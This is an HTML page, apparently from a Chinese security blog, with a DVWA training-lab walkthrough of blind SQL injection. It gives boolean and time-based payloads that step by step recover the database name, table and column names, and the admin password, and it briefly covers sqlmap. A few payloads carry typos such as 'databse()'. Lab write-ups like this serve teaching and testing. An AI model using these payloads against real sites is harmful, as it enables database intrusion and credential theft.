@@ -1,0 +1,985 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="drkless docs">
+      
+      
+        <link rel="canonical" href="https://darkless.cn/my-docs/DVWA-sql-blind-injection/">
+      
+      
+        <meta name="author" content="hand">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="ja">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.1.2">
+    
+    
+      
+        <title>SQL Blind Injection - DarkLess</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application.3020aac5.css">
+      
+        <link rel="stylesheet" href="../assets/stylesheets/application-palette.224b79ff.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../assets/javascripts/modernizr.01ccdecf.js"></script>
+    
+    
+      
+    
+    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
+    
+    
+    
+      
+        
+<script>
+  window.ga = window.ga || function() {
+    (ga.q = ga.q || []).push(arguments)
+  }
+  ga.l = +new Date
+  /* Setup integration and send page view */
+  ga("create", "None", "auto")
+  ga("set", "anonymizeIp", true)
+  ga("send", "pageview")
+  /* Register handler to log search on blur */
+  document.addEventListener("DOMContentLoaded", () => {
+    if (document.forms.search) {
+      var query = document.forms.search.query
+      query.addEventListener("blur", function() {
+        if (this.value) {
+          var path = document.location.pathname;
+          ga("send", "pageview", path + "?q=" + this.value)
+        }
+      })
+    }
+  })
+</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="deep-orange">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#sql" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://darkless.cn/my-docs/" title="DarkLess" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">book</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              DarkLess
+            </span>
+            <span class="md-header-nav__topic">
+              SQL Blind Injection
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href=".." title="首页" class="md-tabs__link">
+        首页
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../DVWA-Brute-Force/" title="DVWA解题" class="md-tabs__link md-tabs__link--active">
+          DVWA解题
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://darkless.cn/my-docs/" title="DarkLess" class="md-nav__button md-logo">
+      
+        <i class="md-icon">book</i>
+      
+    </a>
+    DarkLess
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href=".." title="首页" class="md-nav__link">
+      首页
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      DVWA解题
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        DVWA解题
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-Brute-Force/" title="Brute Force" class="md-nav__link">
+      Brute Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-Command-Injection/" title="Command Injection" class="md-nav__link">
+      Command Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-CSRF/" title="CSRF" class="md-nav__link">
+      CSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-File-Inclusion/" title="File Inclusion" class="md-nav__link">
+      File Inclusion
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-File-Upload/" title="File Upload" class="md-nav__link">
+      File Upload
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-sql-injection/" title="SQL Injection" class="md-nav__link">
+      SQL Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        SQL Blind Injection
+      </label>
+    
+    <a href="./" title="SQL Blind Injection" class="md-nav__link md-nav__link--active">
+      SQL Blind Injection
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sql" title="sql盲注概述" class="md-nav__link">
+    sql盲注概述
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#low" title="Low等级" class="md-nav__link">
+    Low等级
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#medium" title="Medium等级" class="md-nav__link">
+    Medium等级
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#high" title="High等级" class="md-nav__link">
+    High等级
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqlmap" title="使用sqlmap进行注入" class="md-nav__link">
+    使用sqlmap进行注入
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="参考文章" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-Weak Session IDs/" title="Weak Session ID" class="md-nav__link">
+      Weak Session ID
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-XSS-DOM/" title="XSS-DOM" class="md-nav__link">
+      XSS-DOM
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-XSS-Reflected/" title="XSS-Reflected" class="md-nav__link">
+      XSS-Reflected
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA-XSS-Stored/" title="XSS-Stored" class="md-nav__link">
+      XSS-Stored
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sql" title="sql盲注概述" class="md-nav__link">
+    sql盲注概述
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#low" title="Low等级" class="md-nav__link">
+    Low等级
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#medium" title="Medium等级" class="md-nav__link">
+    Medium等级
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#high" title="High等级" class="md-nav__link">
+    High等级
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqlmap" title="使用sqlmap进行注入" class="md-nav__link">
+    使用sqlmap进行注入
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="参考文章" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>SQL Blind Injection</h1>
+                
+                <h2 id="sql">sql盲注概述</h2>
+<p>在<a href="https://darkless.cn/2019/05/02/dvwa-sql-injection/">这篇文章</a>中详细说了sql回显注入的过程，sql盲注相较于回显注入来说难度提升了不少，应为sql盲注界面上不会回显注入结果，我们只能根据界面仅有的提示判断出数据库的表名和字段名等信息。</p>
+<p>sql盲注可以分为布尔型，延迟注入等类型，二者的原理大致相同。</p>
+<ol>
+<li>
+<p>布尔盲注：　布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。</p>
+</li>
+<li>
+<p>时间盲注：　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p>
+</li>
+</ol>
+<p>sql盲注常用的函数：</p>
+<pre><code class="sql">
+lenght() 返回字符串的长度，例如可以返回数据库名字的长度
+
+substr() 用来截取字符串
+
+ascii() 返回字符的ascii码
+
+sleep(n) 将程序挂起一段时间，n为n秒
+
+if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
+</code></pre>
+
+<p>在DVWA上提供的sql盲注的测试页面，下面将会以布尔型注入和延时注入两种方式来解题。</p>
+<h2 id="low">Low等级</h2>
+<p>和sql注入的Low等级一样，此等级未对用户的输入信息做任何过滤，可直接进行注入。</p>
+<p>先输入正常的用户ID进行查询：</p>
+<p><img alt="20190505220645.png" src="https://raw.githubusercontent.com/handbye/images/master/20190505220645.png" /></p>
+<p>输入错误的用户ID进行查询：</p>
+<p><img alt="20190505220740.png" src="https://raw.githubusercontent.com/handbye/images/master/20190505220740.png" /></p>
+<p>可见界面上只会给我们回显这两种信息，第一种师输入正确的，第二种是输入错误的，那我们就不断构造sql语句进行注入，sql语句真确就会回显第一种提示，反之就会回显第二种提示。基于这种方式的sql注入就是布尔型注入。</p>
+<ol>
+<li>判断是否存在注入，注入是字符型还是数字型</li>
+</ol>
+<p>输入1，显示用户存在</p>
+<p><img alt="20190505222552.png" src="https://raw.githubusercontent.com/handbye/images/master/20190505222552.png" /></p>
+<p>输入 1' and 1=1 # 显示用户存在</p>
+<p><img alt="20190505222650.png" src="https://raw.githubusercontent.com/handbye/images/master/20190505222650.png" /></p>
+<p>输入 1' and 1=2 # 显示用户不存在</p>
+<p><img alt="20190505222729.png" src="https://raw.githubusercontent.com/handbye/images/master/20190505222729.png" /></p>
+<p>以上结果说明此处存在数字型的sql盲注</p>
+<ol>
+<li>猜解当前数据库名</li>
+</ol>
+<p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
+<pre><code class="text">
+输入1' and length(database())=1 #，显示不存在；
+
+
+
+输入1' and length(database())=2 #，显示不存在；
+
+
+
+输入1' and length(database())=3 #，显示不存在；
+
+
+
+输入1' and length(database())=4 #，显示存在;
+</code></pre>
+
+<p>以上结果说明数据库名长度为4 ，<strong>正常情况下请使用二分法</strong>。</p>
+<p>同样使用<strong>二分法</strong>猜解数据库名。</p>
+<pre><code class="text">
+输入1' and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
+
+
+
+输入1' and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
+
+
+
+输入1' and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
+
+
+
+输入1' and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
+
+
+
+输入1' and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
+
+
+
+输入1' and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。
+
+
+
+...
+</code></pre>
+
+<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p>
+<ol>
+<li>猜解数据库中的表名</li>
+</ol>
+<p>首先猜解数据库中表的数量：</p>
+<pre><code class="text">
+1' and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在
+
+
+
+1' and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在
+</code></pre>
+
+<p>说明数据库中共有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<pre><code class="text">
+1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在
+
+
+
+1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在
+
+
+
+...
+
+
+
+1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
+</code></pre>
+
+<p>说明第一个表名长度为9。</p>
+<pre><code class="text">
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在
+
+
+
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在
+
+
+
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在
+
+
+
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在
+
+
+
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在
+</code></pre>
+
+<p>说明第一个表的名字的第一个字符为小写字母g。</p>
+<p>...</p>
+<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p>
+<ol>
+<li>猜解表中的字段名</li>
+</ol>
+<p>首先猜解表中字段的数量：</p>
+<pre><code class="text">
+1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在
+
+
+
+…
+
+
+
+1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在
+</code></pre>
+
+<p>说明users表有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<pre><code class="text">
+1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在
+
+
+
+…
+
+
+
+1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在
+</code></pre>
+
+<p>说明users表的第一个字段为7个字符长度。</p>
+<p>采用二分法，即可猜解出所有字段名。</p>
+<ol>
+<li>猜解用户名密码</li>
+</ol>
+<p>同样采用二分法。</p>
+<p>用户 admin 存在吗？</p>
+<pre><code class="text">
+1' and (select count(*) from users where user = 'admin') = 1 #
+</code></pre>
+
+<p>admin 密码的第一位在 a~m 之间吗？</p>
+<pre><code class="text">
+1' and ascii(substr((select password from users where user = 'admin' limit 1),1,1)) &gt;= 97 and ascii(substr((select password from users where user = 'admin' limit 1),1,1)) &lt;= 109 #
+</code></pre>
+
+<p>...</p>
+<p>后续过程略。</p>
+<p>还可以使用<strong>基于时间的盲注</strong>：</p>
+<ol>
+<li>判断是否存在注入，注入是字符型还是数字型</li>
+</ol>
+<pre><code class="text">
+输入1’ and sleep(5) #，感觉到明显延迟；
+
+
+
+输入1 and sleep(5) #，没有延迟；
+</code></pre>
+
+<p>说明存在字符型的基于时间的盲注。</p>
+<ol>
+<li>猜解当前数据库名</li>
+</ol>
+<p>首先猜解数据名的长度：</p>
+<pre><code class="text">
+1’ and if(length(database())=1,sleep(5),1) # 没有延迟
+
+
+
+1’ and if(length(database())=2,sleep(5),1) # 没有延迟
+
+
+
+1’ and if(length(database())=3,sleep(5),1) # 没有延迟
+
+
+
+1’ and if(length(database())=4,sleep(5),1) # 明显延迟
+</code></pre>
+
+<p>说明数据库名长度为4个字符。</p>
+<p>接着采用二分法猜解数据库名：</p>
+<pre><code class="text">
+1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟
+
+
+
+…
+
+
+
+1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟
+
+
+
+1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟
+</code></pre>
+
+<p>说明数据库名的第一个字符为小写字母d。</p>
+<p>…</p>
+<p>重复上述步骤，即可猜解出数据库名。</p>
+<ol>
+<li>猜解数据库中的表名</li>
+</ol>
+<p>首先猜解数据库中表的数量：</p>
+<pre><code class="text">
+1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟
+
+
+
+1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
+</code></pre>
+
+<p>说明数据库中有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<pre><code class="text">
+1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟
+
+
+
+…
+
+
+
+1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
+</code></pre>
+
+<p>说明第一个表名的长度为9个字符。</p>
+<p>采用二分法即可猜解出表名。</p>
+<ol>
+<li>猜解表中的字段名</li>
+</ol>
+<p>首先猜解表中字段的数量：</p>
+<pre><code class="text">
+1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟
+
+
+
+…
+
+
+
+1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
+</code></pre>
+
+<p>说明users表中有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<pre><code class="text">
+1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟
+
+
+
+…
+
+
+
+1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
+</code></pre>
+
+<p>说明users表的第一个字段长度为7个字符。</p>
+<p>采用二分法即可猜解出各个字段名。</p>
+<ol>
+<li>猜解用户名密码</li>
+</ol>
+<p>同样采用二分法。</p>
+<h2 id="medium">Medium等级</h2>
+<p>和sql回显注入一样，Medium可以通过抓包修改参数的方式注入,具体过程和low等级相同.</p>
+<h2 id="high">High等级</h2>
+<p><img alt="20190505233010.png" src="https://raw.githubusercontent.com/handbye/images/master/20190505233010.png" /></p>
+<p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+<p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，所以可以使用基于布尔的盲注.</p>
+<h2 id="sqlmap">使用sqlmap进行注入</h2>
+<p>sql盲注使用手工的方式简直能把人搞崩溃,幸亏有sqlmap这种自动化工具来帮忙. 这里仅演示High等级的sqlmap注入,其它等级和sql回显注入相同,参考<a href="https://darkless.cn/2019/05/02/dvwa-sql-injection/">上篇文章</a>.</p>
+<p><img alt="20190505234030.png" src="https://raw.githubusercontent.com/handbye/images/master/20190505234030.png" /></p>
+<h2 id="_1">参考文章</h2>
+<p><a href="https://www.freebuf.com/articles/web/120985.html">https://www.freebuf.com/articles/web/120985.html</a></p>
+<p><a href="https://www.jianshu.com/p/65f05e7cc957">https://www.jianshu.com/p/65f05e7cc957</a></p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../DVWA-sql-injection/" title="SQL Injection" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                SQL Injection
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../DVWA-Weak Session IDs/" title="Weak Session ID" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                Weak Session ID
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy;2019 darkless
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../assets/fonts/font-awesome.css">
+    
+      <a href="http://darkless.cn" class="md-footer-social__link fa fa-globe"></a>
+    
+      <a href="https://github.com/handbye" class="md-footer-social__link fa fa-github-alt"></a>
+    
+      <a href="https://weibo.com/handbye" class="md-footer-social__link fa fa-weibo"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application.267712eb.js"></script>
+      
+        
+        
+          
+          <script src="../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../assets/javascripts/lunr/lunr.ja.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
+      
+    
+  </body>
+</html>
